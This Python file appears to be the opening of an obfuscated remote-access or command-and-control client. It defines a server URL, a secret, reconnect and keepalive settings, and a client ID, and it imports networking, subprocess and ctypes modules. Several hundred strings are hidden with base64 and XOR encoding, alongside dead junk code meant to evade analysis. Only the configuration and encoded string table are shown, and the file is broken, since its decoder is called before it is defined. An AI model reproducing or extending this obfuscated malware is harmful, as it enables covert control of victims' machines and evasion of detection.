
import os, io, sys, re, json, time, base64, ctypes, shutil, socket, sqlite3
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque
_SERVER  = _D("_s1")   
_SECRET  = _D("_s2")        
_RECON   = 5                                  
_RECON_MAX = 120                              
_CLIENT_ID = None                             
_VERSION = _D("_s3")                           
_KEEPALIVE = 300                              
def _D(b):
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
_s1 = "A2t3d3NwOSwscWJwc2tmcWYtbG1xZm1nZnEtYGxu"
_s2 = "gfPg8vHp5PPkrOLt6OTv9azq5Piss7GztQ=="
_s3 = "uouUipSL"
_s4 = "YxMaDRMWFw=="
_s5 = "1aWspbCntrm8pQ=="
_s6 = "kvHg6+Lm/Q=="
_s7 = "PExFUkxJSA=="
_s8 = "XCwlPz0r"
_s9 = "gfH48eTz4u3o8Q=="
_s10 = "HGxvaWh1cA=="
_s11 = "s8PK0sbX2tw="
_s12 = "mvno4+ru9Q=="
_s13 = "/LmurrOuxtyMlYzclZKPiJ2QkNyMhYiUk5LRj5Ofl5mIlZOnn5CVmZKIoQ=="
_s14 = "58LPhpSEk46Kgs6Ux7zCz4uCkYKLiYaKgs6UusfCz4qClJSGgILOlA=="
_s15 = "SDgxJjg9PA=="
_s16 = "vMvV2MjU"
_s17 = "MUZYXwID"
_s18 = "5pWFlIODiA=="
_s19 = "CHtrem1tZg=="
_s20 = "1qW1pLOzuA=="
_s21 = "pNPBxsfFyQ=="
_s22 = "MEJVXFVRQ1U="
_s23 = "QzAgMSYmLQ=="
_s24 = "A3BgcWZmbQ=="
_s25 = "re/q//U="
_s26 = "bCY8KSs="
_s27 = "GWp6a3x8d0Z/a3h0fA=="
_s28 = "Fjh8ZnE="
_s29 = "l+Dy9fT2+sjx5fb68g=="
_s30 = "WzI2Ojw+"
_s31 = "RwsuMSJnKi4kNSg3LygpImc0MzUiJiouKSBnMS4mZzc+JjIjLihnpcHVZxAGEWckLzIpLDRnpcHVZyUmNCJxc2k="
_s32 = "2qqju6++s7U="
_s33 = "s97a0OzAx9LHxsA="
_s34 = "0r+7sY2hprOmp6E="
_s35 = "PlNXXWFNSl9KS00="
_s36 = "g9Tx4vOj8eL0o9PAzqPq7aPio+7q7eru4u+j1MLVo+vm4ufm8aPw7KPh8ez08Obx8KPg4u2j5+bg7Ofmo+r3rQ=="
_s37 = "q5ef2OKf2J/Y4uPj4uLj45/Y4g=="
_s38 = "s+H69fU="
_s39 = "1rK3orc="
_s40 = "IE1JQ39EQVRB"
_s41 = "J1dUUlNOSw=="
_s42 = "i/jy+P/u5tT4/+r/+A=="
_s43 = "mvf/9/Xo48Xq/+j5//Tu"
_s44 = "waykrK6zuJ61rrWgrZ6mow=="
_s45 = "4oaLkYm9hJCHh72FgA=="
_s46 = "dhgTAikFExgCKRsU"
_s47 = "vs3b0M3RzM0="
_s48 = "URIeHAIBFBI="
_s49 = "lvnm8/jm4u8="
_s50 = "KllPXllDTg=="
_s51 = "lMDRxtk="
_s52 = "ZhUSAg8I"
_s53 = "6Z2MkZ0="
_s54 = "EGd5fiMi"
_s55 = "LltaSAMW"
_s56 = "Cnl+ZXo="
_s57 = "rdnI38DEw8zB8sLY2d3Y2Q=="
_s58 = "kOPk/+A="
_s59 = "TSg1JDlH"
_s60 = "Wxk6ODA8KTQuNT97MD4iNzQ8PD4peywyLzN7Kz4pdiwyNT80LHs8KTQuKzI1PHs6NT97Kz4pMjQ/Mjh7PTcuKDN1"
_s61 = "meng9+ns7Q=="
_s62 = "cxgWCh8cFCwABxIHBgA="
_s63 = "m/D+4vf0/MTo7/rv7ug="
_s64 = "rcbI1MHCyvLe2czZ2N4="
_s65 = "l+D++aSl"
_s66 = "/J+UnY4="
_s67 = "8ZqUiJ2elq6VkIWQ"
_s68 = "bAINAQk="
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
_s69 = "KEtYXXdYTVpLTUZc"
_s70 = "PVNcUFg="
_s71 = "uNbXzJje183W3A=="
_s72 = "rt7Xzc/Z"
_s73 = "36mws6qyug=="
_s74 = "EWFocnBm"
_s75 = "6pqTiYud"
_s76 = "TDslIn9+"
_s77 = "6pKZj54="
_s78 = "NUJcWwYH"
_s79 = "osbD0NXLzA=="
_s80 = "HTJOZG5peHAyUXR/b3xvZDJecm94Tnhva3R+eG4yUHhzaD1YZWlvfG4ySG54bzNweHNoMl5yc2l4c2luMk94bnJob354bjJeWk54bm50cnM="
_s81 = "UDw/Nzk+MyQ8"
_s82 = "leL8+6an"
_s83 = "xqKntLGvqA=="
_s84 = "mOj16/3s"
_s85 = "bh0XHRoLAw0aAg=="
_s86 = "ImFKQ0xFRwJGR1FJVk1SAlVDTk5SQ1JHUAJEUE1PAk5NQUNOAlJDVkoCTVACd3BuDA=="
_s87 = "L0dbW18VAAA="
_s88 = "LQNHXUo="
_s89 = "z4mmo6rvoaC776mguqGr"
_s90 = "ZhEPCFVU"
_s91 = "/6iek5OPno+ajd+cl56RmJqb"
_s92 = "eh4bCA0TFA=="
_s93 = "+5SImoiYiZKLjw=="
_s94 = "aD8JBAQYCRgNGkgLAAkGDw0M"
_s95 = "1rGls6Kiv7ixpQ=="
_s96 = "7sPDjInDnY2Pgos="
_s97 = "9aKUmZmFlIWQh9WGkIE="
_s98 = "2Jyd+La3rPirraiot6qsvbw="
_s99 = "xJesq7PkpeS0q7SxtOSpobe3paOh5KarvOo="
_s100 = "zLulov/+"
_s101 = "74uOnZiGgQ=="
_s102 = "bAMfDR8PHgUcGA=="
_s103 = "QTskLyg1OA=="
_s104 = "RBcsKzMq"
_s105 = "GFdofXY4TUpUOHF2OHx9fnltdGw4emp3b2t9ajY="
_s106 = "x5OmrKLnqKmi57SktaKiqbSvqLPnpqmj57Wis7K1qeeus+k="
_s107 = "rcDe3o3DwtmNzNvMxMHMz8HI"
_s108 = "66msubM="
_s109 = "eD8dDFgZCAgKFwARFRkMHVgfHRcUFxsZDBEXFlgOERlYMShW"
_s110 = "lv7i4ublrLm5/+a79+b/uPX5+7n85fn4uQ=="
_s111 = "SSw7OyY7"
_s112 = "35O2rKv/trGsq76zs7q7/76vr7O2vL6rtrCxrPE="
_s113 = "qN/Bxpua"
_s114 = "6q6DmZqGi5Oki4eP"
_s115 = "y6+qubyipQ=="
_s116 = "5pWflZKDi7mWlImAj4qDlA=="
_s117 = "4YWRioY="
_s118 = "MWFdUEgRUBFTVFRBEUJeRF9VERlmWF9VXkZCGB8="
_s119 = "wrWrrPHw"
_s120 = "re/IyN3IyQ=="
_s121 = "/o6fjpKfhw=="
_s122 = "bDwADRUJCA=="
_s123 = "y5iuqrmoo+utpLnrraKnrrjrpqq/qKOipazrquu7qr+/rrml6+Ovrru/o+anoqaiv66v662kueu4qq2uv7Li5Q=="
_s124 = "MXRJVFJERVQRUBFCWVRdXRFSXlxcUF9VEVBfVRFDVEVEQ18RXkRFQURFHw=="
_s125 = "UAQZHRUfBQQ="
_s126 = "z42joKyk4LqhraOgrKTvoqC6vKrvrqGr76Sqtq2grr2r76ahv7q77+eYpqGroLi876Cho7bj772qvrqmvaq8766roqah5uE="
_s127 = "ZhEPCFVU"
_s128 = "eDEWCA0MWBoUFxsTHRw="
_s129 = "SggmJSkhaiwrIyYvLmpiJC8vLjlqKy4nIyRj"
_s130 = "IXVETU9EVQ=="
_s131 = "woqWlpI="
_s132 = "xo6SkpaV"
_s133 = "BEl9V1VI"
_s134 = "BFZhYG13"
_s135 = "L2JAQUhAa20="
_s136 = "fisuEC4="
_s137 = "pfb24fU="
_s138 = "x4SvtaiqoqSmtLM="
_s139 = "O3gLAQ4NAQkM"
_s140 = "ECAgKiEhKiMi"
_s141 = "AjFBODcwODow"
_s142 = "WBpgYmpvYh0a"
_s143 = "ezpPQUNIQT5M"
_s144 = "VmQVbBBmbGMS"
_s145 = "Rnd+fARyfHV2"
_s146 = "qZHok5rvk5jq"
_s147 = "Bj8yPDMxPDRF"
_s148 = "wfHx+/CA+/Dw"
_s149 = "i7u7sb67sb69"
_s150 = "XGxsZm0eZmho"
_s151 = "hra2vLfCvLHD"
_s152 = "a11bUV9eUSkv"
_s153 = "s4ODiYPwiYGK"
_s154 = "I2FgGRoRGRVh"
_s155 = "v4+PhY79hYmM"
_s156 = "ouaSmOaSmJKR"
_s157 = "ppeenJSQnJKf"
_s158 = "t/GPjYOBjYb0"
_s159 = "rpztlJualJef"
_s160 = "0ODg6uLk6pKV"
_s161 = "z///9f779YmL"
_s162 = "NQUFDwRwD3YH"
_s163 = "MXJdUEJCWFdIEVARXFBSWVhfVBFFSEFUEVNQQlRVEV5fEVhFQhFeQVRfEUFeQ0VCEVBfVRFeRVlUQxFSXURUQh8="
_s164 = "MkBdR0ZXQA=="
_s165 = "hvb07+jy4/Q="
try:
    raise Exception()
except:
    pass
_s166 = "YAwJDhUYPxMFEhYFEg=="
_s167 = "h+vu6fL/2PTi9fHi9Q=="
_s168 = "AnVrbGZtdXFdcmE="
_s169 = "BHd9amtoa2N9"
_s170 = "nNLdz7yzvNr18Pm8z/nu6vnu"
_s171 = "+4ySlZ+UjIikiJ6JjZ6J"
_s172 = "eg0TFB4VDQklChk="
_s173 = "GW5wd312bmpGaXo="
_s174 = "PFhdSF1eXU9Z"
_s175 = "HGhsMXB1cnc="
_s176 = "cQMeBAUUAw=="
_s177 = "AXZkY15yZHN3ZHM="
_s178 = "qeDG/YmGieTMzcDIie3M38DKzA=="
_s179 = "RCU0NCgh"
_s180 = "nfDy//Tx+A=="
_s181 = "NVJaWlJZUA=="
_s182 = "7L+BjZ6YzKSDgYnMqImahY+J"
_s183 = "YhADERIABxAQGw=="
_s184 = "6oaDhJ+StZmPmJyPmA=="
_s185 = "fwwQEQY="
_s186 = "FUZ4dGdhNUFDNTo1WHBxfHQ="
_s187 = "YQMTDhUJBBM="
_s188 = "36+ttrGruq0="
_s189 = "pNHKz8rL08o="
_s190 = "o/LWysDIg/fg84PAzM3NxsDXg9DAws2DzM2DwoPPytDXg8zFg9PM0dfQjYPxxtfW0c3Qg8/K0NeDzMWDzNPGzYPTzNHX0I0="
_s191 = "nNv56Lzy+ejr8+73vPXy6Pnu+v3/+e+wvP3/6PXq+bz/8/Ly+f/o9fPy77C83c7MvOj9/vD5sLz98vi87PPu6LHv//3yvO757+nw6O+y"
_s192 = "Zg8IEgMUAAcFAxU="
_s193 = "jf3++Pnk4Q=="
_s194 = "uNbZ1d0="
_s195 = "z66rq72qvLyqvA=="
_s196 = "MFZRXVlcSQ=="
_s197 = "ehseHggfCQk="
_s198 = "tNrRwNnVx98="
_s199 = "iuj45evu6ev5/g=="
_s200 = "HHVyaHluen1/eW8="
_s201 = "GHF2bH1qfnl7fWtHfWpqd2o="
_s202 = "m+vo7u/y9w=="
_s203 = "TC8jIiIpLzglIyI/"
_s204 = "2ry7t7O2ow=="
_s205 = "L1tWX0o="
_s206 = "F3t4dHZ7"
_s207 = "HW94cHJpeA=="
_s208 = "ssHG08bHwQ=="
_s209 = "YgENDAwHARYLDQwRPQcQEA0Q"
_s210 = "IFdJThMS"
_s211 = "hvHv6LW0"
_s212 = "lPDt+vX5/fc="
_s213 = "8paLnJOfm4OHlw=="
_s214 = "m+/i6/4="
_s215 = "heT39drg9/fq9w=="
_s216 = "o5GRl40="
_s217 = "IHVOS05PV04="
_s218 = "676FgIWEnIU="
_s219 = "DmJhbW9iUWBrenlhfGU="
_s220 = "+Y+cl52Wiw=="
_s221 = "H3BvenFAb3Bta2w="
_s222 = "q8TbzsX02M7Z3cLIztg="
_s223 = "HXB8fnV0c3hCaWRteA=="
_s224 = "z6KurKemoaqQo66tqqM="
_s225 = "/pOfnZaXkJuhl52RkA=="
_s226 = "+5qJi6SPgoue"
_s227 = "Yw0GFxQMEQg="
_s228 = "74yAgYGKjJuGgIGc"
_s229 = "OEpdVVdMXQ=="
_s230 = "aVhbXkc="
_s231 = "UmNlYHw="
_s232 = "mam3qbept6k="
_s233 = "QSQ5NSQzLyAtHikuMjUy"
_s234 = "r9/A3ds="
_s235 = "LF9JXlpFT0k="
_s236 = "m+jv+u/u6A=="
_s237 = "6oaFiYuGtYuOjpg="
_s238 = "AW9kdXZuc2o="
_s239 = "l/Lv4/Ll+fb7yP/45OPk"
_s240 = "BGVoaFt0a3Zwdw=="
_s241 = "4oOOjr2SjZCWkQ=="
_s242 = "juv2+uv84O/i0ebh/fr9"
_s243 = "ZgMeEgMUCAcKOQ4JFRIV"
_s244 = "Uzs8ICc9Mj42"
_s245 = "fQ0SDwk="
_s246 = "yLinurw="
_s247 = "yo+yvrirqb7quau8r67qnaOMo+q6q7m5vaW4rrnqvKOr6qSvvrmi6r2mq6Tq4p2jpK6lvbnj5A=="
_s248 = "fgkXEE1M"
_s249 = "g+3m9/Dr"
_s250 = "QhIwLSQrLg=="
_s251 = "H3F6a2x3"
_s252 = "2rm1tK6/tK8="
_s253 = "1qWlv7I="
_s254 = "RCE2Nis2"
_s255 = "egoIFRwTFh8J"
_s256 = "2p6vt6r6iZuX+rK7qbK/qfqvqbO0vfqov736qbusv/ryqL+rr7Oov6n6u763s7Tz9A=="
_s257 = "CH9hZjs6"
_s258 = "yay7u6a7"
_s259 = "7Lipobw="
_s260 = "gfPg8t7y4Ow="
_s261 = "/oyfjaGNh40="
_s262 = "kuHz5Pc="
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s263 = "Wyg6LT4="
_s264 = "3oWf84S/86SDhf7zoIOl7fLt56M="
_s265 = "ZgcVBQ8P"
_s266 = "QiMmLyssKzE2MCM2LTA="
_s267 = "n+j7/vjq6/bz9uvm/vz88Orx6w=="
_s268 = "Emdhd2B8c393"
_s269 = "JFFXQVZKRUlB"
_s270 = "MldAQF1A"
_s271 = "7Z6Yjo6Inp4="
_s272 = "ocTT087T"
_s273 = "VBAhOSR0GAcVBwd0JCY7NzEnJ3Q5MTk7Ji10Ij01dDc7OSciNyd6MDg4dBk9Oj0QITkkdHwmMSUhPSYxJ3Q1MDk9On16"
_s274 = "ner0866v"
_s275 = "kPXi4v/i"
_s276 = "8oaTgZmem4GG"
_s277 = "dxsEFgQE"
_s278 = "Dmt8fGF8"
_s279 = "67+uprs="
_s280 = "GGtte3t9a2s="
_s281 = "95OCmoeohJ6NkqialQ=="
_s282 = "C29+ZntUe2p/Yw=="
_s283 = "PVNSSVg="
_s284 = "kPXi4v/i"
_s285 = "37qtrbCt"
_s286 = "PXhFSU9cXkkdXlxeVVhZHV5PWFlYU0lUXFFOHUtUXB1eUFlWWEQdXFNZHUtcSFFJXlBZHRVqVFNZUkpOFBM="
_s287 = "yL+hpvv6"
_s288 = "s9De19jWyg=="
_s289 = "x6Sqo6yivg=="
_s290 = "Xh03PDI7"
_s291 = "gOPt5Ovl+Q=="
_s292 = "l/T68/zy7g=="
_s293 = "FVZ8d3lw"
_s294 = "J1FGUktTREpD"
_s295 = "l8Xy5Pji5fTy"
_s296 = "3au8qLGp"
_s297 = "24mutfu6t7f7uKm+v761r7K6t/uzuqmtvqivsrW8+7a+r7O0v6j7urW/+6m+r66ptfu4tLa5srW+v/upvqiut6+o9Q=="
_s298 = "zLulqqU="
_s299 = "WjYpOykp"
_s300 = "geLg4unk5Q=="
_s301 = "+pKViY6Um5ef"
_s302 = "bxsGAgocGw4CHw=="
_s303 = "zbXjteO1"
_s304 = "vc3OyMnU0Q=="
_s305 = "DTw/OiM="
_s306 = "yvvz+OT7/PLk+w=="
_s307 = "PE9fXVJSWVg="
_s308 = "scLE09/UxQ=="
_s309 = "KVpKSEdHTE0="
_s310 = "UTk+IiU/MDw0"
_s311 = "KllHSHVLSUlPWVlDSEZP"
_s312 = "jvjn6/k="
_s313 = "TT0sPzksKg=="
_s314 = "6ZqEi7aIioqMmpqAi4WM"
_s315 = "eQ4UEBo="
_s316 = "x4qupLWotKihsw=="
_s317 = "JVJITHpERkZAVlZMR0lA"
_s318 = "6oKFmZ6Z"
_s319 = "dh4ZBQIFKRAZAxgS"
_s320 = "7pmHgIqBmZ2xhoGdmp0="
_s321 = "OEtVWmdZW1tdS0tRWlRd"
_s322 = "ehMUHB8ZDhsYFh8="
_s323 = "aRocCwcMHRo="
_s324 = "C19ueH8rYm0rbGJ9bmUraHlub25lf2JqZ3grfGR5YCtqbGpiZXh/K2orf2p5bG5/LHgrWEZJK2pvZmJlK3hjanluJQ=="
_s325 = "9oGfmMXE"
_s326 = "p8TIysrGycOHxMjK18vC08LDh9TSxMTC1NTB0svL3g=="
_s327 = "Jm9IQENFUgZHBlJHVEFDUgZQT0cGdWtkHAZFSVZfBkpPUkMGQ15DCgZFVENHUkMGVUNUUE9FQwoGVVJHVFIGT1II"
_s328 = "IFdJThMS"
_s329 = "QRMAEjEpJDMkDSg1JG8kOSQ="
_s330 = "pcbKyNXJwNHAwYXW0MbGwNbWw9DJydw="
_s331 = "EnF9Yms="
_s332 = "dxQYBx4SEw=="
_s333 = "itjL2fri7/jvxuP+7w=="
_s334 = "TSwhPygsKTRtKDUkPjk+"
_s335 = "RicqNCMnIj9mNDMoKC8oIQ=="
_s336 = "KmNETE9JXgpLCl5LWE1PXgpcQ0sKfWdjEApJWE9LXk8KWlhFSU9ZWQpYT0dFXk9GUwQ="
_s337 = "yL+hpvv6"
_s338 = "8qCzoYKal4CXvpuGl9yXipc="
_s339 = "J0RISldLQlNCQwdUUkREQlRUQVJLS14="
_s340 = "awgEGxI="
_s341 = "G1h0bnd/O3V0bzt4dGtiO31yd347bXJ6O0hWWTszeGl+f351b3J6d2g7dnpiO3l+O2xpdHV8Mg=="
_s342 = "xpSjsrO0qJCnqrOj5vvm9g=="
_s343 = "VzYiIzg="
_s344 = "pPDW3YTQy4TNysLBx9CExYTQxdbDwdCE0dfNysOE0MzBhNfUwcfNws3BwITJwdDMy8CEjMvWhMXR0MuJwMHQwcfQjYo="
_s345 = "J3VmdFdPQlVCa05TQglCX0I="
_s346 = "NkJXRFFTQg=="
_s347 = "2bisrbY="
_s348 = "4I2FlIiPhL+Vk4WE"
_s349 = "CmdvfmJlblV/eW9u"
_s350 = "mPX96+v5//0="
_s351 = "sdzUxdne1e7EwtTV"
_s352 = "1ruzor65somjpbOy"
_s353 = "7JuFgt/e"
_s354 = "RjU1LyI="
_s355 = "pfL15Jf19u4="
_s356 = "FENEVSZER18="
_s357 = "eS4pOCkqMg=="
_s358 = "cB8AFR4="
_s359 = "+JeInZY="
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
_s360 = "dh4CAgZMWVkBAQFYGx8VBBkFGRACWBUZG1kYEwIBGQQdHxgRWSE6NzhZBgQZEB8aE1kARw=="
_s361 = "q8Pf39uRhITc3NyFxsLI2cTYxM3fhcjExoTFzt/cxNnAwsXMhPzn6uWE29nEzcLHzoTdmg=="
_s362 = "UAQVHQA="
_s363 = "yqSvvrmi"
_s364 = "guzn9vHq"
_s365 = "852Wh4Cb"
_s366 = "Ujw3JiE6"
_s367 = "o8DMzc3GwNfGxw=="
_s368 = "q8re38P0xsTPzg=="
_s369 = "RCE2Nis2"
_s370 = "JFdHRUpKQUA="
_s371 = "0Lm+trWzpLGyvLU="
_s372 = "6pmHiLWLiYmPmZmDiIaP"
_s373 = "dTQRGBwbHAYBBxQBGgc="
_s374 = "P1ZRWVpcS1pb"
_s375 = "bBsFCgUzBQIKCQ8YMx4JHxkAGA=="
_s376 = "gufw8O3w"
_s377 = "PmpMRx5fHlJXTUoeUVgeXUxbWltQSldfUk0eX1lfV1BNSh5fHlJXTUoeUVgeSl9MWVtKTRIeTFtKS0xQHk1LXV1bTU1YS1IeTl9XTE0Q"
_s378 = "ZBEXARYKBQkB"
_s379 = "odHA0tLWztPF"
_s380 = "RTEkNyIgMQ=="
_s381 = "+riPk5ae2pvalpOJjtqVnNqZiJ+en5SOk5uWidqOldqOiIPanIiVl9qSm4iMn4mOn57anpuOm9Q="
_s382 = "j+7r4ubh"
_s383 = "6p+Zj5iEi4eP"
_s384 = "xbW3qqOsqaC2"
_s385 = "w7OxrKWqr6aw"
_s386 = "6pqLmZmdhZiO"
_s387 = "zpWBnouA4YCBgIuT"
_s388 = "hPH34fbq5enh"
_s389 = "Akd6dnBjYXYicWN0Z2YicmNxcXVtcGZxImNsZiJhbW1pa2dxImRwbW8iQWpwbW9nLiJHZmVnLiJEa3BnZG16LA=="
_s390 = "TS4lPyIgKA=="
_s391 = "ruLh7e/i7/7+6u/67w=="
_s392 = "vP3s7Pj96P0="
_s393 = "h8Do6ODr4g=="
_s394 = "fR4VDxIQGA=="
_s395 = "yqmiuKWnrw=="
_s396 = "CEVha3pne2dufA=="
_s397 = "2L28v70="
_s398 = "+56fnJ4="
_s399 = "JmtJXE9KSkc="
_s400 = "DWtkf2hrYnU="
_s401 = "QCYpMiUmLzg="
_s402 = "B0J/c3VmZHMnd2Z0dHBodWN0J2F1aGonRG91aGpucmoqZWZ0YmMnZXVocHRidXQnL0RvdWhqYisnQmNgYisnRXVmcWIrJ0h3YnVmKSkpLik="
_s403 = "NUVURkZCWkdRRg=="
_s404 = "KW1MT0hcRV0="
_s405 = "LGBDS0VCDGhNWE0="
_s406 = "4LSlrbA="
_s407 = "nM/Z0NnfyLzz7vX79fLD6e7wsLzp7/nu8v3x+cPq/fDp+bC87P3v7+vz7vjD6v3w6fm82s7T0bzw8/v18u8="
_s408 = "ZQYXHBURCg=="
_s409 = "Gmp7aWltdWh+aQ=="
_s410 = "JkNUVElU"
_s411 = "0J61pKe/ors="
_s412 = "eToWFhIQHAo="
_s413 = "KHxtZXg="
_s414 = "OWp8dXx6bRlRVkpNZlJcQBUZV1hUXBUZXFdaS0BJTVxdZk9YVUxcGX9rdnQZWlZWUlBcShl1cHRwbRkLCQk="
_s415 = "nf7y8vb0+O4="
_s416 = "/JmOjpOO"
_s417 = "8raXkYCLgobSsZqAnZ+X3beWlZfSgpOBgYWdgJbSh4GbnJXSpZuclp2FgdK2orOiu9LZ0rO3od/Ax8TftbG/3A=="
_s418 = "z5ShoO+rrruukg=="
_s419 = "z5S7oKDvvKegvbuS"
_s420 = "gNv17uvu7/fuoObv8u3h9KA="
_s421 = "Nnp5dXd6d2Zmcndidw=="
_s422 = "hsHp6eHq4w=="
_s423 = "Mn9bUUBdQV1URg=="
_s424 = "jM7+7frp3+Pq+Pvt/uk="
_s425 = "ou3Sx9DDgvHNxNbVw9DH"
_s426 = "zICjr62g7J+4rbip"
_s427 = "4JWUhs3Y"
_s428 = "FXpmSnZnbGVh"
_s429 = "yY2ZiJmA"
_s430 = "8ZKTtZCFkA=="
_s431 = "UiIwFjMmMw=="
_s432 = "wbS1p+z5"
_s433 = "wZqioK+vrrXhpaSis7ixtZw="
_s434 = "HVhlaW98fmk9bnxreHk9cXJ6dHNuPXtvcnA9W3RveHtyZT1tb3J7dHF4bjM="
_s435 = "6ZmImpqehpuNmg=="
_s436 = "ZwsIAA4JFEkNFAgJ"
_s437 = "ah8eDEdS"
_s438 = "yKSnr6Gmuw=="
_s439 = "VCQ1JycjOyYwJw=="
_s440 = "EXl+YmV/cHx0"
_s441 = "3Kmvua6yvbG5"
_s442 = "8YGQgoKGnoOV"
_s443 = "F2dleHF+e3I="
_s444 = "A2ZtYHF6c3dmZw=="
_s445 = "95SYmJyekoTZhIabnoOS"
_s446 = "SR0MBBk="
_s447 = "IXJkbWRidQFJTlJVDQFPQExEDQFXQE1URAFnc25sAUxOW35CTk5KSERSAW1obGh1ARMREQ=="
_s448 = "QiEtLSkrJzE="
_s449 = "OlJVSU4="
_s450 = "0KaxvKW1"
_s451 = "kPXi4v/i"
_s452 = "WBw3LzY0Nzk8eDl4PjE0PXg+Kjc1eA0KFHg5Njx4NygsMTc2OTQ0IXg9ID07LSw9eDEsdg=="
_s453 = "MWV0fGE="
_s454 = "06S6veDh"
_s455 = "8oWbnMHA"
_s456 = "gPDh9Og="
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
_s457 = "o83CzsY="
_s458 = "/5qNjZCN"
_s459 = "HntsbHFs"
_s460 = "7IKNgYk="
_s461 = "i//y++4="
_s462 = "L0JAS0ZJRkpL"
_s463 = "w62irqY="
_s464 = "SDwxOC0="
_s465 = "nu7/6vY="
_s466 = "aB8JGgYBBg8="
_s467 = "/LKTiNyak4mSmA=="
_s468 = "Uxc2PzYnNjc="
_s469 = "xaGksaQ="
_s470 = "nPnu7vPu"
_s471 = "yomir6mh6rmvuLyvuOqspbjqq+qkr73qqaajr6S+6ryvuLmjpaTk6pivvr+4pLnq4qSvvZW8r7i5o6Wk5uqupb2kpqWrrpW/uKbj6qW46uKEpaSv5uqEpaSv4+Q="
_s472 = "BSpkdWwqZmlsYGtxKHB1YWRxYA=="
_s473 = "gffk8/Lo7u8="
_s474 = "2Ly3r7a0t7m8h62qtA=="
_s475 = "Ux08cyYjNzInNnM6PTU8czA8PTU6NCYhNjdzPD1zIDYhJTYh"
_s476 = "HlpxaXBycX96Pmp2ez5we2k+MHtmez5/cHo+bWp/eXs+fz58f2p9dj5tfWx3bmo+anE+bHtucn99ezVse21qf2xqMA=="
_s477 = "kMTV3cA="
_s478 = "spfM1II="
_s479 = "qd7Ax5qb"
_s480 = "fSgNGRwJGF0OHg8UDQldERwIEx4VGBldUF0YBRQJFBMaXQkSXRwNDREEXQgNGRwJGA=="
_s481 = "DE15eGMheXxobXhpLGV/LFtlYmhje38hY2JgdSxqY34sYmN7"
_s482 = "gMPo5eProOnmoPL17u7p7ueg9+n06KDh5O3p7qDw8un26ezl5+XzoKjX6e7k7/fzoO/u7Pmprg=="
_s483 = "lOP9+qem"
_s484 = "cQYYH0JD"
_s485 = "Wg8bGXo4Iyo7KSl6Myl6DTM0PjUtKXc1NDYj"
_s486 = "rNvFwt7Jy4zCw9iMzdrNxcDNzsDJjMrD3oz57e+MztXczd/f"
_s487 = "2vf3v7a/rLuuv74="
_s488 = "3PHxr7muqrmu"
_s489 = "vJGR2dDZyt3I2dg="
_s490 = "9rKTmpORl4KTs46TlYOCkw=="
_s491 = "yo6vpq+tq76vj7Kvqb++rw=="
_s492 = "ZzAuKSMuNQ=="
_s493 = "676qqMuJkpuKmJjLn5mCjIyOmY6Py8bLjpOCn4KFjMuInpmZjoWfy4KFmJ+KhYiO"
_s494 = "2oi/t7Wsv/q8tb6yv7aqv6j6qL+9s6muqKP6sb+jqfq2v7yu+rij+q6yv/q4o6q7qan0"
_s495 = "dzMSGxIQFgMSMg8SFAIDEg=="
_s496 = "s+by8JPB1tTawMfBypPQ39bS3dbXk8bD"
_s497 = "aDgNGgEHDAELCQQEEUgYAQYPSBwADUgbDRoeDRpIAA0JBBwASA0GDBgHAQYcSBwHSBgaDR4NBhxIOg0GDA0aSA4aBwVIGwQNDRgBBg9G"
_s498 = "JwhGV04IT0JGS1NP"
_s499 = "1p2zs6b7t7q/oLP2pr+4sfaZnQ=="
_s500 = "XDouMyY5Mg=="
_s501 = "l+D++aSl"
_s502 = "mNnIyNzZzNk="
_s503 = "yeeopKizpqekvLqgqg=="
_s504 = "4J7PzoGNgZqPjo2Vk4mD"
_s505 = "qOnFydLHxuXd28HL4M3E2M3ahs3QzQ=="
_s506 = "iqen+e/4/O/4"
_s507 = "vJGR1dg="
_s508 = "PUpUUw4P"
_s509 = "LWxATFdCQ2BYXkROZUhBXUhf"
_s510 = "PH1sbHh9aH0="
_s511 = "UhM/Myg9PB8nITsxGjc+IjcgfCQwIQ=="
_s512 = "CUBnen1oZWVsbTMpWn1oe318eSlfS1o="
_s513 = "q9jIw9/K2MDY"
_s514 = "l+T0/+P25Pzk"
_s515 = "HldwbWp/cnJ7eiQ+Sn9tdQ=="
_s516 = "EHNif35kcXI="
_s517 = "56aKhp2IiaqSlI6Er4KLl4KV"
_s518 = "EXJjfn9lcHM="
_s519 = "jsfg/frv4uLr6rSu7fzh4Prv7A=="
_s520 = "DHIjIm9jYmplayN/dX94aWFoI3l/aX4="
_s521 = "mfj0+OP29/Ts6vD6tPH89en867fq/Ovv8Pr8"
_s522 = "cwAKAAcWHhAHHw=="
_s523 = "RzQ+NDMiKiQzKw=="
_s524 = "aCEGGxwJBAQNDFJIGxEbHA0FDA=="
_s525 = "hfLs67a3"
_s526 = "6aiEiJOGh6ScmoCKoYyFmYyb"
_s527 = "pOX09ODl8OU="
_s528 = "qtnJwt7L2cHZ"
_s529 = "74ydgIGbjo0="
_s530 = "Tg8jLzQhIAM7PSctBisiPis8"
_s531 = "SgsnKzAlJAc/OSMpAi8mOi84"
_s532 = "XT4vMjMpPD8="
_s533 = "xrjp6KWpqKCvoem1v7Wyo6ui6bO1o7Tpp6unvKmoq7O1r6XrrqOqtqO06LWjtLCvpaM="
_s534 = "EGNpY2R1fXNkfA=="
_s535 = "m+ji6O/+9vjv9w=="
_s536 = "BHdndmFhag=="
_s537 = "UCc1MjMxPQ=="
_s538 = "74yAgYGKjJs="
_s539 = "2pm1tLS/ua6/vg=="
_s540 = "mvn28//07sXo//3z6e7/6A=="
_s541 = "iOHm7uc="
_s542 = "2K2rvaq2ubW9"
_s543 = "MFZVUURFQlVD"
_s544 = "VzYiMz44"
_s545 = "xqKvtaWpqKijpbI="
_s546 = "GFxxa3t3dnZ9e2x9fA=="
_s547 = "2au8vrCqrau4rbC2t4a2sg=="
_s548 = "lfb5/PD74cr88Q=="
_s549 = "DHtlamVTZWJqaW94Uw=="
_s550 = "rtnHyMfxx8DIy83a8dzL3dvC2g=="
_s551 = "UiEmMyAmDSExIDc3PA0xMyImJyA3"
_s552 = "XjMxMDcqMSw="
_s553 = "ne7+7/j488L+/O3p6O/4wu7p/Ono7g=="
